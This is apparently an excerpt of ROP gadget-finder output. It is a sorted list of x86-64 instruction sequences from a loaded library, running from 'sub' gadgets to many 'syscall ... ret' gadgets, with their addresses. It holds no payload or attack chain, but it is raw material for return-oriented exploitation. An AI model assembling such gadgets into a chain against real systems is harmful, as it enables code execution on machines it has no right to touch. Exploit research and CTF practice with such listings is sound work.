0x00002aaaaab097bd : sub eax, edx ; shr rax, 0x3f ; ret
0x00002aaaaac46ef7 : sub eax, edx ; vzeroupper ; ret
0x00002aaaaac5be41 : sub eax, esi ; jmp qword ptr [rax - 0x1f000fd6]
0x00002aaaaab4a2a5 : sub eax, esi ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x00002aaaaab4776c : sub eax, esi ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaab507fa : sub eax, esi ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab4dfb8 : sub eax, esp ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaabe500b : sub eax, r8d ; cmp sil, dl ; cmovne eax, ecx ; ret
0x00002aaaaac1835b : sub ebp, dword ptr [rax] ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaac584be : sub ebp, eax ; fcomp qword ptr [rdi - 0x4a] ; ret 0x474c
0x00002aaaaab42f3b : sub ebx, dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x00002aaaaac56f55 : sub ebx, dword ptr [rbx - 0xb] ; pop rbx ; and dword ptr [rsi + rbp*2 - 0x7a], edi ; lahf ; ret 0x871e
0x00002aaaaaad7f9b : sub ebx, dword ptr [rsp + rax*2] ; nop ; ret 0x5bdb
0x00002aaaaab8e33e : sub ebx, eax ; mov eax, ebx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab8e26c : sub ebx, eax ; mov eax, ebx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac5be2c : sub ebx, esp ; out dx, eax ; jmp qword ptr [rax + 0x24]
0x00002aaaaab0af94 : sub ecx, -0x80 ; shr ecx, 3 ; rep stosq qword ptr [rdi], rax ; ret
0x00002aaaaac15584 : sub ecx, dword ptr [rax - 0x75] ; and al, 8 ; add rsp, 0x10 ; pop rbx ; ret
0x00002aaaaab1e125 : sub ecx, dword ptr [rax - 0x7d] ; ret
0x00002aaaaab7aa51 : sub ecx, dword ptr [rax] ; add byte ptr [rax], al ; ret
0x00002aaaaabe4fe0 : sub ecx, eax ; cmp sil, al ; mov eax, edx ; cmove eax, ecx ; ret
0x00002aaaaabc9f9d : sub ecx, edi ; add ecx, 0x50 ; shr ecx, 3 ; rep stosq qword ptr [rdi], rax ; ret
0x00002aaaaab0af92 : sub ecx, edi ; sub ecx, -0x80 ; shr ecx, 3 ; rep stosq qword ptr [rdi], rax ; ret
0x00002aaaaabe4f67 : sub ecx, esi ; cmp dil, al ; mov eax, edx ; cmove eax, ecx ; ret
0x00002aaaaac02bd9 : sub ecx, esi ; mov qword ptr [rdx + 0x58], rdi ; mov qword ptr [rdx + 0x68], rcx ; ret
0x00002aaaaabe4fdf : sub ecx, r8d ; cmp sil, al ; mov eax, edx ; cmove eax, ecx ; ret
0x00002aaaaab7f3dc : sub edi, 0x10 ; add rax, rdi ; ret
0x00002aaaaabdeae8 : sub edi, 0x30 ; xor eax, eax ; cmp edi, 9 ; setbe al ; ret
0x00002aaaaab72f56 : sub edi, dword ptr [rcx] ; ret 0x2774
0x00002aaaaac48c79 : sub edi, dword ptr [rdx + rbp*8 + 0x1f0fff] ; ret
0x00002aaaaac692b1 : sub edi, ebx ; jmp qword ptr [rax]
0x00002aaaaac7c171 : sub edi, edx ; call qword ptr [rdi]
0x00002aaaaac69999 : sub edi, esp ; call rax
0x00002aaaaac69a39 : sub edi, esp ; jmp qword ptr [rax]
0x00002aaaaac69a59 : sub edi, esp ; jmp rax
0x00002aaaaab73564 : sub edx, 0x40 ; add rdx, rax ; jl 0x9e5db ; add rax, rdi ; ret
0x00002aaaaab1d05e : sub edx, 1 ; jne 0x4804a ; mov eax, 1 ; ret
0x00002aaaaab1d1f6 : sub edx, 1 ; jne 0x481e2 ; mov eax, 1 ; ret
0x00002aaaaab51890 : sub edx, dword ptr [rax + 0x10] ; mov eax, dword ptr [rdi + 0x10] ; sub eax, edx ; ret
0x00002aaaaab51885 : sub edx, dword ptr [rax + 0x18] ; mov eax, dword ptr [rdi + 0x10] ; sub eax, edx ; ret
0x00002aaaaab62fb4 : sub edx, eax ; jbe 0x8dff7 ; add rax, rdi ; ret
0x00002aaaaab62fc4 : sub edx, eax ; jbe 0x8dff9 ; lea rax, qword ptr [rdi + rax + 0x10] ; ret
0x00002aaaaab62fd4 : sub edx, eax ; jbe 0x8dff9 ; lea rax, qword ptr [rdi + rax + 0x20] ; ret
0x00002aaaaab62fe4 : sub edx, eax ; jbe 0x8dff9 ; lea rax, qword ptr [rdi + rax + 0x30] ; ret
0x00002aaaaaba753b : sub edx, eax ; jmp 0xd2554
0x00002aaaaab09eff : sub edx, eax ; mov eax, edx ; sar eax, 0x10 ; ret
0x00002aaaaab09ebe : sub edx, ecx ; not eax ; and eax, edx ; ret
0x00002aaaaac7c159 : sub edx, edi ; jmp qword ptr [rdi]
0x00002aaaaac6f559 : sub edx, edi ; jmp rsp
0x00002aaaaac5c6b1 : sub edx, esi ; call qword ptr [rax + 0x10fff229]
0x00002aaaaac5c6b5 : sub edx, esi ; call qword ptr [rax]
0x00002aaaaac5c719 : sub edx, esi ; jmp rsp
0x00002aaaaac5c715 : sub edx, esi ; lcall ptr [rcx + rbp] ; jmp rsp
0x00002aaaaac5c711 : sub edx, esi ; lcall ptr [rsi] ; sub edx, esi ; lcall ptr [rcx + rbp] ; jmp rsp
0x00002aaaaab49012 : sub edx, esi ; mov rdi, r15 ; call rax
0x00002aaaaab4d774 : sub edx, esi ; mov rdi, rbx ; call rax
0x00002aaaaab6b7d2 : sub esi, 1 ; jne 0x967d0 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab6b87a : sub esi, 1 ; jne 0x96877 ; xor eax, eax ; ret
0x00002aaaaabf801e : sub esi, 1 ; mov byte ptr [rdi + 1], sil ; ret
0x00002aaaaac1704a : sub esi, dword ptr [rcx] ; ror byte ptr [rax - 0x7d], 0xc4 ; sbb byte ptr [rbx + 0x5d], bl ; ret
0x00002aaaaac5ced0 : sub esi, dword ptr [rdx - 0x441b000d] ; call qword ptr [rdx]
0x00002aaaaac5be49 : sub esi, eax ; jmp qword ptr [rax]
0x00002aaaaac02c6f : sub esi, eax ; mov eax, esi ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaac7a311 : sub esi, ebp ; jmp qword ptr [rdi]
0x00002aaaaabd1244 : sub esi, ebx ; ret
0x00002aaaaabcb290 : sub esp, -0x80 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac1071e : sub esp, -0x80 ; pop rbx ; ret
0x00002aaaaab5d268 : sub esp, 0x80 ; call 0x114498
0x00002aaaaac00349 : sub esp, 8 ; call 0x137645
0x00002aaaaab738d0 : sub esp, 8 ; call 0x8ab75
0x00002aaaaac009c1 : sub esp, 8 ; call 0xfc82b
0x00002aaaaab42dd2 : sub esp, 8 ; mov rdi, qword ptr [rdi + 0xe0] ; call rax
0x00002aaaaac69a35 : sub esp, edi ; inc dword ptr [rax + 0x2b] ; cld ; jmp qword ptr [rax]
0x00002aaaaac69a55 : sub esp, edi ; inc dword ptr [rax] ; sub edi, esp ; jmp rax
0x00002aaaaaba753a : sub r10, rax ; jmp 0xd2555
0x00002aaaaabe2b5b : sub r14b, r8b ; add byte ptr [rax], ah ; jmp 0x10db2b
0x00002aaaaab51018 : sub r8, rcx ; lea eax, dword ptr [r8 - 1] ; ret
0x00002aaaaab47d68 : sub r8, rcx ; sar r8, 2 ; lea eax, dword ptr [r8 - 1] ; ret
0x00002aaaaabf4aa2 : sub r8b, byte ptr [r8] ; add rsp, 8 ; ret
0x00002aaaaabf53e4 : sub r8b, byte ptr [rax] ; ret
0x00002aaaaabe8f53 : sub r8d, dword ptr [r8] ; test eax, eax ; jne 0x113f69 ; xor eax, eax ; ret
0x00002aaaaabe8f83 : sub r8d, dword ptr [r8] ; test eax, eax ; jne 0x113f99 ; xor eax, eax ; ret
0x00002aaaaabe8fb3 : sub r8d, dword ptr [r8] ; test eax, eax ; jne 0x113fc9 ; xor eax, eax ; ret
0x00002aaaaabe8fe3 : sub r8d, dword ptr [r8] ; test eax, eax ; jne 0x113ff9 ; xor eax, eax ; ret
0x00002aaaaabe8fe2 : sub r8d, dword ptr [r8] ; test eax, eax ; jne 0x113ffa ; xor eax, eax ; ret
0x00002aaaaabe9013 : sub r8d, dword ptr [r8] ; test eax, eax ; jne 0x114029 ; xor eax, eax ; ret
0x00002aaaaabe9133 : sub r8d, dword ptr [r8] ; test eax, eax ; jne 0x114149 ; xor eax, eax ; ret
0x00002aaaaabe9163 : sub r8d, dword ptr [r8] ; test eax, eax ; jne 0x114179 ; xor eax, eax ; ret
0x00002aaaaabe9193 : sub r8d, dword ptr [r8] ; test eax, eax ; jne 0x1141a9 ; xor eax, eax ; ret
0x00002aaaaabe91c3 : sub r8d, dword ptr [r8] ; test eax, eax ; jne 0x1141d9 ; xor eax, eax ; ret
0x00002aaaaabe91f3 : sub r8d, dword ptr [r8] ; test eax, eax ; jne 0x114209 ; xor eax, eax ; ret
0x00002aaaaabe9223 : sub r8d, dword ptr [r8] ; test eax, eax ; jne 0x114239 ; xor eax, eax ; ret
0x00002aaaaabe9043 : sub r8d, dword ptr [rax] ; test eax, eax ; jne 0x114059 ; xor eax, eax ; ret
0x00002aaaaabe9073 : sub r8d, dword ptr [rax] ; test eax, eax ; jne 0x114089 ; xor eax, eax ; ret
0x00002aaaaabe90a3 : sub r8d, dword ptr [rax] ; test eax, eax ; jne 0x1140b9 ; xor eax, eax ; ret
0x00002aaaaabe90d3 : sub r8d, dword ptr [rax] ; test eax, eax ; jne 0x1140e9 ; xor eax, eax ; ret
0x00002aaaaabe9103 : sub r8d, dword ptr [rax] ; test eax, eax ; jne 0x114119 ; xor eax, eax ; ret
0x00002aaaaabe9253 : sub r8d, dword ptr [rax] ; test eax, eax ; jne 0x114269 ; xor eax, eax ; ret
0x00002aaaaabe9283 : sub r8d, dword ptr [rax] ; test eax, eax ; jne 0x114299 ; xor eax, eax ; ret
0x00002aaaaabe92e3 : sub r8d, dword ptr [rax] ; test eax, eax ; jne 0x1142f9 ; xor eax, eax ; ret
0x00002aaaaabe92e2 : sub r8d, dword ptr [rax] ; test eax, eax ; jne 0x1142fa ; xor eax, eax ; ret
0x00002aaaaabe9313 : sub r8d, dword ptr [rax] ; test eax, eax ; jne 0x114329 ; xor eax, eax ; ret
0x00002aaaaac0c725 : sub rax, -0x80 ; add rsp, 8 ; ret
0x00002aaaaab59508 : sub rax, 0x10 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaaba24e3 : sub rax, 1 ; add rsp, 0x38 ; pop rbx ; pop rbp ; ret
0x00002aaaaab6b969 : sub rax, 1 ; jne 0x96968 ; pop rbx ; pop rbp ; ret
0x00002aaaaab7e923 : sub rax, 1 ; ret
0x00002aaaaabe8ef3 : sub rax, qword ptr [rax] ; test eax, eax ; jne 0x113f09 ; xor eax, eax ; ret
0x00002aaaaabe8f23 : sub rax, qword ptr [rax] ; test eax, eax ; jne 0x113f39 ; xor eax, eax ; ret
0x00002aaaaab520bd : sub rax, qword ptr [rdi + 0x18] ; ret
0x00002aaaaab4c4d4 : sub rax, qword ptr [rdi + 0x20] ; ret
0x00002aaaaab4c3c4 : sub rax, qword ptr [rdi + 0x38] ; ret
0x00002aaaaab484f4 : sub rax, qword ptr [rdx + 0x10] ; sar rax, 2 ; ret
0x00002aaaaab4c4c5 : sub rax, qword ptr [rdx + 0x18] ; sar rax, 2 ; ret
0x00002aaaaab4c3b5 : sub rax, qword ptr [rdx + 0x30] ; sar rax, 2 ; ret
0x00002aaaaab4dfb7 : sub rax, r12 ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab4776b : sub rax, r14 ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaab507f9 : sub rax, r14 ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaac1ea5d : sub rax, r8 ; ret
0x00002aaaaab506dc : sub rax, rbp ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab815aa : sub rax, rbp ; pop rbp ; pop r12 ; ret
0x00002aaaaab5fd08 : sub rax, rdi ; ret
0x00002aaaaab0f64d : sub rax, rdx ; ret
0x00002aaaaab097bc : sub rax, rdx ; shr rax, 0x3f ; ret
0x00002aaaaac46ef6 : sub rax, rdx ; vzeroupper ; ret
0x00002aaaaac02bd8 : sub rcx, rsi ; mov qword ptr [rdx + 0x58], rdi ; mov qword ptr [rdx + 0x68], rcx ; ret
0x00002aaaaab7f3db : sub rdi, 0x10 ; add rax, rdi ; ret
0x00002aaaaab1d05d : sub rdx, 1 ; jne 0x4804b ; mov eax, 1 ; ret
0x00002aaaaab1d1f5 : sub rdx, 1 ; jne 0x481e3 ; mov eax, 1 ; ret
0x00002aaaaab62fb3 : sub rdx, rax ; jbe 0x8dff8 ; add rax, rdi ; ret
0x00002aaaaab62fc3 : sub rdx, rax ; jbe 0x8dffa ; lea rax, qword ptr [rdi + rax + 0x10] ; ret
0x00002aaaaab62fd3 : sub rdx, rax ; jbe 0x8dffa ; lea rax, qword ptr [rdi + rax + 0x20] ; ret
0x00002aaaaab62fe3 : sub rdx, rax ; jbe 0x8dffa ; lea rax, qword ptr [rdi + rax + 0x30] ; ret
0x00002aaaaab49011 : sub rdx, rsi ; mov rdi, r15 ; call rax
0x00002aaaaab4d773 : sub rdx, rsi ; mov rdi, rbx ; call rax
0x00002aaaaab6b7d1 : sub rsi, 1 ; jne 0x967d1 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab6b879 : sub rsi, 1 ; jne 0x96878 ; xor eax, eax ; ret
0x00002aaaaabcb28f : sub rsp, -0x80 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac1071d : sub rsp, -0x80 ; pop rbx ; ret
0x00002aaaaab5d267 : sub rsp, 0x80 ; call 0x114499
0x00002aaaaac00348 : sub rsp, 8 ; call 0x137646
0x00002aaaaac00347 : sub rsp, 8 ; call 0x137647
0x00002aaaaab738cf : sub rsp, 8 ; call 0x8ab76
0x00002aaaaab42dd1 : sub rsp, 8 ; mov rdi, qword ptr [rdi + 0xe0] ; call rax
0x00002aaaaac69990 : sub spl, dil ; call qword ptr [rax]
0x00002aaaaac699b0 : sub spl, dil ; inc dword ptr [rax] ; sub bh, ah ; jmp rax
0x00002aaaaab09890 : subps xmm0, xmm1 ; ret
0x00002aaaaab0988f : subsd xmm0, xmm1 ; ret
0x00002aaaaab09c24 : subss xmm0, xmm1 ; ret
0x00002aaaaabf9581 : syscall ; add rsp, 0x48 ; pop rbx ; pop rbp ; ret
0x00002aaaaabd9acc : syscall ; cmp rax, -0x1000 ; ja 0x104aeb ; ret
0x00002aaaaabdb78c : syscall ; cmp rax, -0x1000 ; ja 0x1067ab ; ret
0x00002aaaaabdb9ce : syscall ; cmp rax, -0x1000 ; ja 0x1069ea ; ret
0x00002aaaaabdba80 : syscall ; cmp rax, -0x1000 ; ja 0x106a9b ; ret
0x00002aaaaabdbaba : syscall ; cmp rax, -0x1000 ; ja 0x106adb ; ret
0x00002aaaaabdc66b : syscall ; cmp rax, -0x1000 ; ja 0x10768a ; ret
0x00002aaaaabdc7eb : syscall ; cmp rax, -0x1000 ; ja 0x10780a ; ret
0x00002aaaaabdcc85 : syscall ; cmp rax, -0x1000 ; ja 0x107c9a ; ret
0x00002aaaaabdcd27 : syscall ; cmp rax, -0x1000 ; ja 0x107d42 ; ret
0x00002aaaaabdcdd7 : syscall ; cmp rax, -0x1000 ; ja 0x107df2 ; ret
0x00002aaaaabe9c38 : syscall ; cmp rax, -0x1000 ; ja 0x114c53 ; ret
0x00002aaaaabe9ce5 : syscall ; cmp rax, -0x1000 ; ja 0x114d15 ; ret
0x00002aaaaabeb9aa : syscall ; cmp rax, -0x1000 ; ja 0x1169cb ; ret
0x00002aaaaabeba5a : syscall ; cmp rax, -0x1000 ; ja 0x116a7b ; ret
0x00002aaaaab0a426 : syscall ; cmp rax, -0x1000 ; ja 0x3545b ; ret
0x00002aaaaab0a72e : syscall ; cmp rax, -0x1000 ; ja 0x3574b ; ret
0x00002aaaaab0a79a : syscall ; cmp rax, -0x1000 ; ja 0x357bb ; ret
0x00002aaaaab0a7e4 : syscall ; cmp rax, -0x1000 ; ja 0x357fa ; ret
0x00002aaaaab90885 : syscall ; cmp rax, -0x1000 ; ja 0xbb8a3 ; ret
0x00002aaaaab9c825 : syscall ; cmp rax, -0x1000 ; ja 0xc7843 ; pop rbx ; ret
0x00002aaaaab9da9f : syscall ; cmp rax, -0x1000 ; ja 0xc8aba ; ret
0x00002aaaaaba042e : syscall ; cmp rax, -0x1000 ; ja 0xcb44a ; ret
0x00002aaaaaba04c8 : syscall ; cmp rax, -0x1000 ; ja 0xcb4e2 ; ret
0x00002aaaaaba05b9 : syscall ; cmp rax, -0x1000 ; ja 0xcb5d2 ; ret
0x00002aaaaaba1711 : syscall ; cmp rax, -0x1000 ; ja 0xcc72a ; ret
0x00002aaaaaba1781 : syscall ; cmp rax, -0x1000 ; ja 0xcc79a ; ret
0x00002aaaaaba19d5 : syscall ; cmp rax, -0x1000 ; ja 0xcc9ea ; ret
0x00002aaaaaba1a55 : syscall ; cmp rax, -0x1000 ; ja 0xcca6a ; ret
0x00002aaaaabcb003 : syscall ; cmp rax, -0x1000 ; ja 0xf601b ; ret
0x00002aaaaabcb052 : syscall ; cmp rax, -0x1000 ; ja 0xf606b ; ret
0x00002aaaaabcb0a3 : syscall ; cmp rax, -0x1000 ; ja 0xf60bb ; ret
0x00002aaaaabcb0fb : syscall ; cmp rax, -0x1000 ; ja 0xf611b ; ret
0x00002aaaaabcb15f : syscall ; cmp rax, -0x1000 ; ja 0xf617b ; ret
0x00002aaaaabcb1b8 : syscall ; cmp rax, -0x1000 ; ja 0xf61d3 ; ret
0x00002aaaaabcb397 : syscall ; cmp rax, -0x1000 ; ja 0xf63b3 ; ret
0x00002aaaaabcba61 : syscall ; cmp rax, -0x1000 ; ja 0xf6aab ; ret
0x00002aaaaabcfee0 : syscall ; cmp rax, -0x1000 ; ja 0xfaefb ; ret
0x00002aaaaabcff34 : syscall ; cmp rax, -0x1000 ; ja 0xfaf4b ; ret
0x00002aaaaabd0688 : syscall ; cmp rax, -0x1000 ; ja 0xfb6a2 ; ret
0x00002aaaaabd0bac : syscall ; cmp rax, -0x1000 ; ja 0xfbbca ; ret
0x00002aaaaabd1458 : syscall ; cmp rax, -0x1000 ; ja 0xfc472 ; ret
0x00002aaaaabd1508 : syscall ; cmp rax, -0x1000 ; ja 0xfc522 ; ret
0x00002aaaaabd15b3 : syscall ; cmp rax, -0x1000 ; ja 0xfc5ca ; ret
0x00002aaaaabd1623 : syscall ; cmp rax, -0x1000 ; ja 0xfc63a ; ret
0x00002aaaaabd16a4 : syscall ; cmp rax, -0x1000 ; ja 0xfc6ba ; ret
0x00002aaaaabd1754 : syscall ; cmp rax, -0x1000 ; ja 0xfc76a ; ret
0x00002aaaaabd1ca4 : syscall ; cmp rax, -0x1000 ; ja 0xfccbb ; ret
0x00002aaaaabd33c5 : syscall ; cmp rax, -0x1000 ; ja 0xfe3e3 ; ret
0x00002aaaaabd3459 : syscall ; cmp rax, -0x1000 ; ja 0xfe473 ; ret
0x00002aaaaabd34f9 : syscall ; cmp rax, -0x1000 ; ja 0xfe513 ; ret
0x00002aaaaabd354d : syscall ; cmp rax, -0x1000 ; ja 0xfe56b ; ret
0x00002aaaaabd58e7 : syscall ; cmp rax, -0xfff ; jae 0x1008fc ; ret
0x00002aaaaabd5b55 : syscall ; cmp rax, -0xfff ; jae 0x100b6a ; ret
0x00002aaaaabd5b85 : syscall ; cmp rax, -0xfff ; jae 0x100b9a ; ret
0x00002aaaaabd5bbe : syscall ; cmp rax, -0xfff ; jae 0x100c03 ; ret
0x00002aaaaabd5c15 : syscall ; cmp rax, -0xfff ; jae 0x100c2a ; ret
0x00002aaaaabd5c45 : syscall ; cmp rax, -0xfff ; jae 0x100c5a ; ret
0x00002aaaaabd5c78 : syscall ; cmp rax, -0xfff ; jae 0x100c8d ; ret
0x00002aaaaabd5ca5 : syscall ; cmp rax, -0xfff ; jae 0x100cba ; ret
0x00002aaaaabd5cd5 : syscall ; cmp rax, -0xfff ; jae 0x100cea ; ret
0x00002aaaaabd5d05 : syscall ; cmp rax, -0xfff ; jae 0x100d1a ; ret
0x00002aaaaabd5d35 : syscall ; cmp rax, -0xfff ; jae 0x100d4a ; ret
0x00002aaaaabda3f8 : syscall ; cmp rax, -0xfff ; jae 0x10540d ; ret
0x00002aaaaabda425 : syscall ; cmp rax, -0xfff ; jae 0x10543a ; ret
0x00002aaaaabda455 : syscall ; cmp rax, -0xfff ; jae 0x10546a ; ret
0x00002aaaaabda488 : syscall ; cmp rax, -0xfff ; jae 0x10549d ; ret
0x00002aaaaabda4b8 : syscall ; cmp rax, -0xfff ; jae 0x1054cd ; ret
0x00002aaaaabda4e5 : syscall ; cmp rax, -0xfff ; jae 0x1054fa ; ret
0x00002aaaaabda518 : syscall ; cmp rax, -0xfff ; jae 0x10552d ; ret
0x00002aaaaabda545 : syscall ; cmp rax, -0xfff ; jae 0x10555a ; ret
0x00002aaaaabda575 : syscall ; cmp rax, -0xfff ; jae 0x10558a ; ret
0x00002aaaaabda5a8 : syscall ; cmp rax, -0xfff ; jae 0x1055bd ; ret
0x00002aaaaabda5d5 : syscall ; cmp rax, -0xfff ; jae 0x1055ea ; ret
0x00002aaaaabda608 : syscall ; cmp rax, -0xfff ; jae 0x10561d ; ret
0x00002aaaaabdb6f5 : syscall ; cmp rax, -0xfff ; jae 0x10670a ; ret
0x00002aaaaabdb725 : syscall ; cmp rax, -0xfff ; jae 0x10673a ; ret
0x00002aaaaabdb855 : syscall ; cmp rax, -0xfff ; jae 0x10686a ; ret
0x00002aaaaabdb895 : syscall ; cmp rax, -0xfff ; jae 0x1068aa ; ret
0x00002aaaaabdb8c5 : syscall ; cmp rax, -0xfff ; jae 0x1068da ; ret
0x00002aaaaabdb8f5 : syscall ; cmp rax, -0xfff ; jae 0x10690a ; ret
0x00002aaaaabdb925 : syscall ; cmp rax, -0xfff ; jae 0x10693a ; ret
0x00002aaaaabdbb48 : syscall ; cmp rax, -0xfff ; jae 0x106b5d ; ret
0x00002aaaaabdbb75 : syscall ; cmp rax, -0xfff ; jae 0x106b8a ; ret
0x00002aaaaabdbba5 : syscall ; cmp rax, -0xfff ; jae 0x106bba ; ret
0x00002aaaaabdbbd5 : syscall ; cmp rax, -0xfff ; jae 0x106bea ; ret
0x00002aaaaabdbc18 : syscall ; cmp rax, -0xfff ; jae 0x106c2d ; ret
0x00002aaaaabdbc45 : syscall ; cmp rax, -0xfff ; jae 0x106c5a ; ret
0x00002aaaaabdbc75 : syscall ; cmp rax, -0xfff ; jae 0x106c8a ; ret
0x00002aaaaabdbca5 : syscall ; cmp rax, -0xfff ; jae 0x106cba ; ret
0x00002aaaaabdbcd5 : syscall ; cmp rax, -0xfff ; jae 0x106cea ; ret
0x00002aaaaabdbd05 : syscall ; cmp rax, -0xfff ; jae 0x106d1a ; ret
0x00002aaaaabdbd35 : syscall ; cmp rax, -0xfff ; jae 0x106d4a ; ret
0x00002aaaaabdbd65 : syscall ; cmp rax, -0xfff ; jae 0x106d7a ; ret
0x00002aaaaabdbd95 : syscall ; cmp rax, -0xfff ; jae 0x106daa ; ret
0x00002aaaaabdbdc8 : syscall ; cmp rax, -0xfff ; jae 0x106ddd ; ret
0x00002aaaaabdbe01 : syscall ; cmp rax, -0xfff ; jae 0x106e49 ; ret
0x00002aaaaabdbe55 : syscall ; cmp rax, -0xfff ; jae 0x106e6a ; ret
0x00002aaaaabdbe88 : syscall ; cmp rax, -0xfff ; jae 0x106e9d ; ret
0x00002aaaaabdbeb5 : syscall ; cmp rax, -0xfff ; jae 0x106eca ; ret
0x00002aaaaabdbee5 : syscall ; cmp rax, -0xfff ; jae 0x106efa ; ret
0x00002aaaaabdbf15 : syscall ; cmp rax, -0xfff ; jae 0x106f2a ; ret
0x00002aaaaabdbf45 : syscall ; cmp rax, -0xfff ; jae 0x106f5a ; ret
0x00002aaaaabdbf75 : syscall ; cmp rax, -0xfff ; jae 0x106f8a ; ret
0x00002aaaaabdbfa8 : syscall ; cmp rax, -0xfff ; jae 0x106fbd ; ret
0x00002aaaaabdbfd8 : syscall ; cmp rax, -0xfff ; jae 0x106fed ; ret
0x00002aaaaabdc005 : syscall ; cmp rax, -0xfff ; jae 0x10701a ; ret
0x00002aaaaabdc035 : syscall ; cmp rax, -0xfff ; jae 0x10704a ; ret
0x00002aaaaabdc068 : syscall ; cmp rax, -0xfff ; jae 0x10707d ; ret
0x00002aaaaabdc098 : syscall ; cmp rax, -0xfff ; jae 0x1070ad ; ret
0x00002aaaaabdc0c8 : syscall ; cmp rax, -0xfff ; jae 0x1070dd ; ret
0x00002aaaaabdc101 : syscall ; cmp rax, -0xfff ; jae 0x107149 ; ret
0x00002aaaaabdc155 : syscall ; cmp rax, -0xfff ; jae 0x10716a ; ret
0x00002aaaaabdc191 : syscall ; cmp rax, -0xfff ; jae 0x1071d9 ; ret
0x00002aaaaabdc1e5 : syscall ; cmp rax, -0xfff ; jae 0x1071fa ; ret
0x00002aaaaabdc215 : syscall ; cmp rax, -0xfff ; jae 0x10722a ; ret
0x00002aaaaabdc251 : syscall ; cmp rax, -0xfff ; jae 0x107299 ; ret
0x00002aaaaabdc2a5 : syscall ; cmp rax, -0xfff ; jae 0x1072ba ; ret
0x00002aaaaabdc2d8 : syscall ; cmp rax, -0xfff ; jae 0x1072ed ; ret
0x00002aaaaabdc305 : syscall ; cmp rax, -0xfff ; jae 0x10731a ; ret
0x00002aaaaabdc335 : syscall ; cmp rax, -0xfff ; jae 0x10734a ; ret
0x00002aaaaabdc368 : syscall ; cmp rax, -0xfff ; jae 0x10737d ; ret
0x00002aaaaabdc39e : syscall ; cmp rax, -0xfff ; jae 0x1073e3 ; ret
0x00002aaaaabdc3f5 : syscall ; cmp rax, -0xfff ; jae 0x10740a ; ret
0x00002aaaaabdc428 : syscall ; cmp rax, -0xfff ; jae 0x10743d ; ret
0x00002aaaaabdc458 : syscall ; cmp rax, -0xfff ; jae 0x10746d ; ret
0x00002aaaaabdc4ae : syscall ; cmp rax, -0xfff ; jae 0x1074f3 ; ret
0x00002aaaaabdc505 : syscall ; cmp rax, -0xfff ; jae 0x10751a ; ret
0x00002aaaaabdc53e : syscall ; cmp rax, -0xfff ; jae 0x107583 ; ret
0x00002aaaaabdc595 : syscall ; cmp rax, -0xfff ; jae 0x1075aa ; ret
0x00002aaaaabdc5c5 : syscall ; cmp rax, -0xfff ; jae 0x1075da ; ret
0x00002aaaaabdc5f8 : syscall ; cmp rax, -0xfff ; jae 0x10760d ; ret
0x00002aaaaabdc625 : syscall ; cmp rax, -0xfff ; jae 0x10763a ; ret
0x00002aaaaabdc721 : syscall ; cmp rax, -0xfff ; jae 0x107769 ; ret
0x00002aaaaabdc77e : syscall ; cmp rax, -0xfff ; jae 0x1077c3 ; ret
0x00002aaaaabdc89e : syscall ; cmp rax, -0xfff ; jae 0x1078e3 ; ret
0x00002aaaaabdc901 : syscall ; cmp rax, -0xfff ; jae 0x107949 ; ret
0x00002aaaaabdc958 : syscall ; cmp rax, -0xfff ; jae 0x10796d ; ret
0x00002aaaaabdc985 : syscall ; cmp rax, -0xfff ; jae 0x10799a ; ret
0x00002aaaaabdc9b5 : syscall ; cmp rax, -0xfff ; jae 0x1079ca ; ret
0x00002aaaaabdc9e8 : syscall ; cmp rax, -0xfff ; jae 0x1079fd ; ret
0x00002aaaaabdcf41 : syscall ; cmp rax, -0xfff ; jae 0x107f89 ; ret
0x00002aaaaabdcfa1 : syscall ; cmp rax, -0xfff ; jae 0x107fe9 ; ret
0x00002aaaaabdcff5 : syscall ; cmp rax, -0xfff ; jae 0x10800a ; ret
0x00002aaaaabdd025 : syscall ; cmp rax, -0xfff ; jae 0x10803a ; ret
0x00002aaaaabdd055 : syscall ; cmp rax, -0xfff ; jae 0x10806a ; ret
0x00002aaaaabdd085 : syscall ; cmp rax, -0xfff ; jae 0x10809a ; ret
0x00002aaaaabdd0b8 : syscall ; cmp rax, -0xfff ; jae 0x1080cd ; ret
0x00002aaaaabdd0e8 : syscall ; cmp rax, -0xfff ; jae 0x1080fd ; ret
0x00002aaaaabdd115 : syscall ; cmp rax, -0xfff ; jae 0x10812a ; ret
0x00002aaaaabdd145 : syscall ; cmp rax, -0xfff ; jae 0x10815a ; ret
0x00002aaaaabdd175 : syscall ; cmp rax, -0xfff ; jae 0x10818a ; ret
0x00002aaaaabdd1a5 : syscall ; cmp rax, -0xfff ; jae 0x1081ba ; ret
0x00002aaaaac14aa8 : syscall ; cmp rax, -0xfff ; jae 0x13fabd ; ret
0x00002aaaaac14af8 : syscall ; cmp rax, -0xfff ; jae 0x13fb0d ; ret
0x00002aaaaab0a765 : syscall ; cmp rax, -0xfff ; jae 0x3577a ; ret
0x00002aaaaab0ae25 : syscall ; cmp rax, -0xfff ; jae 0x35e3a ; ret
0x00002aaaaab40365 : syscall ; cmp rax, -0xfff ; jae 0x6b37a ; ret
0x00002aaaaab40398 : syscall ; cmp rax, -0xfff ; jae 0x6b3ad ; ret
0x00002aaaaab90965 : syscall ; cmp rax, -0xfff ; jae 0xbb97a ; ret
0x00002aaaaab93a55 : syscall ; cmp rax, -0xfff ; jae 0xbea6a ; ret
0x00002aaaaab93a85 : syscall ; cmp rax, -0xfff ; jae 0xbea9a ; ret
